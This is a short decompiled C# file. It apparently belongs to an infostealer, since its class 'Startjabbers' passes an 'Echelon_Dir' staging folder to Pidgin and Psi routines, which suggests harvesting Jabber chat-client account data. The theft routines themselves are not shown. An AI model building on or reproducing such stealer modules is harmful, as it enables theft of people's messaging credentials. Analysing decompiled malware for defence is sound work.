using System;

namespace Mist
{
	// Token: 0x02000055 RID: 85
	internal class Startjabbers
	{
		// Token: 0x06000235 RID: 565 RVA: 0x000057EE File Offset: 0x000039EE
		public static int Start(string Echelon_Dir)
		{
			Pidgin.Start(Echelon_Dir);
			Psi.Start(Echelon_Dir);
			return Startjabbers.count;
		}

		// Token: 0x04000125 RID: 293
		public static int count;
	}
}
